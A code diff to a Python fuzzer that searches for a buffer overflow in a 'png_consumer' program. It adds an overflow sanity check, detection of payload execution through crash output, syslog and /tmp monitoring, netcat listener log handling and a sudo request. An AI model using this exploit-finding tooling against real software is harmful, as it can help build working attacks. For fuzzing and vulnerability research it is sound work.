+            "payload_validated": sanity_passed,
+            "platform": self.platform_id,
+            "payload_offset_attempted": 0,
+            "trigger_offset_attempted": 0,
+            "fitting_payload_addr": "",
+            "fitting_offsets": [],
+            "success_label": 1 if sanity_passed else 0,
+            "confidence_score": 1.0 if sanity_passed else 0.0,
+        })
 
         # Phase 1: Fuzz png_consumer sequentially
         logger.info(f"Starting sequential fuzzing for png_consumer on {base_file_name}...")
@@ -3717,6 +5048,16 @@ class UnifiedFuzzer:
             return
 
         all_results = []
+        file_path = os.path.join(source_dir, png_files[0]) # Use the first file for sanity check, as a representative sample of the base PNG structure 
+        output_dir = os.path.join(target_base_dir, "sanity_check")
+        os.makedirs(output_dir, exist_ok=True)
+        sanity_passed = self._run_png_consumer_overflow_sanity_check(file_path, output_dir)
+        if not sanity_passed:
+            logger.error(f"Sanity check failed for {file_path}")
+            return
+        
+        # Proceed with fuzzing if sanity check passes
+        logger.info(f"Fuzzing platform: {self.platform_id}")
         
         tasks = []
         # Max workers can be adjusted based on system resources.
@@ -3803,15 +5144,132 @@ def main():
         if args.single:
             fuzzer.fuzz_single_file(args.single)
         else:
-            if not os.path.exists(args.source):
-                os.makedirs(args.source)
-                generate_base_png(os.path.join(args.source, "base.png"))
-                logger.info(f"Created sample base.png in {args.source} as source directory was empty.")
+            if not os.path.isdir(args.source):
+                logger.error(
+                    f"Source directory does not exist or is not a directory: {args.source}.\n"
+                    "Please populate this directory with PNG files and rerun."
+                )
+                return
             fuzzer.fuzz_platform(args.source)
     finally:
         # Clean up netcat listener
         fuzzer.cleanup_netcat_listener()
 
+
+
+
+def _search_text_in_paths(trigger_string: str, paths: List[str], max_bytes: int = 1024 * 1024) -> Optional[Tuple[str, str]]:
+    """Search candidate files for a trigger string and return the first matching path and content."""
+    for path in paths:
+        if not path or not os.path.exists(path):
+            continue
+        try:
+            if os.path.isdir(path):
+                for root, _, files in os.walk(path):
+                    for file_name in files:
+                        full_path = os.path.join(root, file_name)
+                        try:
+                            if os.path.getsize(full_path) > max_bytes:
+                                continue
+                            with open(full_path, 'r', errors='ignore') as handle:
+                                content = handle.read()
+                            if trigger_string in content:
+                                return full_path, content.strip()
+                        except Exception:
+                            continue
+                continue
+
+            if os.path.getsize(path) > max_bytes:
+                continue
+            with open(path, 'r', errors='ignore') as handle:
+                content = handle.read()
+            if trigger_string in content:
+                return path, content.strip()
+        except Exception:
+            continue
+    return None
+
+
+def _looks_like_png_consumer_crash_evidence(output: str) -> bool:
+    """Treat crash output or signal reporting as payload execution evidence for png_consumer."""
+    if not output:
+        return False
+    lowered = output.lower()
+    if "vulnerability triggered" in lowered:
+        return True
+    if any(token in lowered for token in ["caught signal", "segmentation fault", "stack trace", "backtrace", "signal "]):
+        return True
+    if re.search(r"child process .* (6|15|16)\b", output, re.IGNORECASE):
+        return True
+    return False
+
+
+def monitor_syslog(trigger_string: str, timeout: int = 5) -> Optional[str]:
+    """Watches the system log for the specified trigger with robust seeking."""
+    log_paths = ['/var/log/syslog', '/var/log/messages', '/var/log/kern.log']
+    for log_path in log_paths:
+        if not os.path.exists(log_path):
+            continue
+        try:
+            with open(log_path, 'r', errors='ignore') as f:
+                # Seek back a bit to catch entries that might have been written just before we started monitoring
+                f.seek(0, os.SEEK_END)
+                size = f.tell()
+                f.seek(max(0, size - 10000), os.SEEK_SET)
+
+                start_time = time.time()
+                while time.time() - start_time < timeout:
+                    line = f.readline()
+                    if not line:
+                        time.sleep(0.1)
+                        continue
+
+                    if trigger_string in line:
+                        return line.strip()
+        except Exception as e:
+            logger.error(f"Error monitoring syslog at {log_path}: {e}")
+    return None
+
+
+def monitor_tmp_dir(trigger_string: str, timeout: int = 5) -> Optional[str]:
+    """Watches the /tmp/ directory for files containing the specified trigger string."""
+    tmp_path = '/tmp'
+    if not os.path.exists(tmp_path):
+        logger.warning(f"Temporary directory not found at {tmp_path}")
+        return None
+    
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        for root, _, files in os.walk(tmp_path):
+            for file_name in files:
+                file_path = os.path.join(root, file_name)
+                try:
+                    # Only check files that are likely to be logs or small outputs
+                    if os.path.getsize(file_path) > 1024 * 1024: # Skip large files
+                        continue
+                    with open(file_path, 'r', errors='ignore') as f:
+                        content = f.read()
+                        if trigger_string in content:
+                            logger.info(f"Payload detected in /tmp/ file: {file_path}")
+                            return content.strip()
+                except PermissionError:
+                    pass # Ignore permission errors for /tmp/ files
+                except Exception as e:
+                    logger.debug(f"Error reading /tmp/ file {file_path}: {e}")
+        time.sleep(0.1)
+    return None
+
+
+
 if __name__ == "__main__":
+    #move netcat log files from ./logs/files/netcat to ./logs/files/netcat/old subdirectory
+    #move only the log files, not the entire directory, to preserve any existing directory structure or permissions 
+    for filename in os.listdir("./logs/files/netcat"):
+        file_path = os.path.join("./logs/files/netcat", filename)
+        if os.path.isfile(file_path):
+            old_dir = "./logs/files/netcat/old"
+            os.makedirs(old_dir, exist_ok=True)
+            shutil.move(file_path, os.path.join(old_dir, filename))
+            
     request_sudo_if_needed()
     main()
